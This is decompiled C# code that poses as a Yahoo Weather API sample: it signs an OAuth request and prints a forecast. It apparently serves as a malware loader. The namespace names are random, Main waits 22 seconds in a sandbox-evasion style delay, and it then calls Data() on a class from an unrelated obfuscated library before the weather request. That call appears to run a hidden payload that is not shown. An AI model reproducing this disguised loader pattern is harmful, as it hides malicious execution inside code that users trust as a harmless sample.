using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Newtonsoft.Json.Linq;
using Undtwd;

namespace Teqizspe;

internal static class Program
{
	private const string cURL = "https://weather-ydn-yql.media.yahoo.com/forecastrss";

	private const string cAppID = "test-app-id";

	private const string cConsumerKey = "your-consumer-key";

	private const string cConsumerSecret = "your-consumer-secret";

	private const string cOAuthVersion = "1.0";

	private const string cOAuthSignMethod = "HMAC-SHA1";

	private const string cWeatherID = "woeid=727232";

	private const string cUnitID = "u=c";

	private const string cFormat = "xml";

	[STAThread]
	private static void Main()
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		WebClient webClient = new WebClient();
		for (int i = 0; i < 22; i++)
		{
			Thread.Sleep(1000);
		}
		ClassLibrary val = new ClassLibrary();
		webClient.Headers.Set("Content-Type", "application/xml");
		val.Data();
		webClient.Headers.Add("X-Yahoo-App-Id", "test-app-id");
		webClient.Headers.Add("Authorization", _get_auth());
		Console.WriteLine("Downloading Yahoo weather report . . .");
		byte[] bytes = webClient.DownloadData("https://weather-ydn-yql.media.yahoo.com/forecastrss?woeid=727232&u=c&format=xml");
		Console.WriteLine(Encoding.ASCII.GetString(bytes));
		Console.Write("Press any key to continue . . . ");
		Console.ReadKey(intercept: true);
	}

	private static dynamic CallRestService(string uri, string method, dynamic parms)
	{
		WebRequest webRequest = WebRequest.Create(uri);
		webRequest.Method = method;
		webRequest.ContentType = "application/json";
		byte[] array = Encoding.UTF8.GetBytes(parms.ToString());
		webRequest.ContentLength = array.Length;
		using (Stream stream = webRequest.GetRequestStream())
		{
			stream.Write(array, 0, array.Length);
		}
		using WebResponse webResponse = webRequest.GetResponse();
		return JObject.Parse(new StreamReader(webResponse.GetResponseStream()).ReadToEnd());
	}

	private static string _get_timestamp()
	{
		return Convert.ToInt64((DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds).ToString();
	}

	private static string _get_nonce()
	{
		return Convert.ToBase64String(new ASCIIEncoding().GetBytes(DateTime.Now.Ticks.ToString()));
	}

	private static string _get_auth()
	{
		string text = _get_nonce();
		string text2 = _get_timestamp();
		string s = "your-consumer-secret" + "&";
		string stringToEscape = string.Format("format={0}&oauth_consumer_key={1}&oauth_nonce={2}&oauth_signature_method={3}&oauth_timestamp={4}&oauth_version={5}&{6}&{7}", "xml", "your-consumer-key", text, "HMAC-SHA1", text2, "1.0", "u=c", "woeid=727232");
		stringToEscape = "GET&" + Uri.EscapeDataString("https://weather-ydn-yql.media.yahoo.com/forecastrss") + "&" + Uri.EscapeDataString(stringToEscape);
		using (HMACSHA1 hMACSHA = new HMACSHA1(Encoding.ASCII.GetBytes(s)))
		{
			stringToEscape = Convert.ToBase64String(hMACSHA.ComputeHash(Encoding.ASCII.GetBytes(stringToEscape)));
		}
		return "OAuth oauth_consumer_key=\"your-consumer-key\", oauth_nonce=\"" + text + "\", oauth_timestamp=\"" + text2 + "\", oauth_signature_method=\"HMAC-SHA1\", oauth_signature=\"" + stringToEscape + "\", oauth_version=\"1.0\"";
	}
}
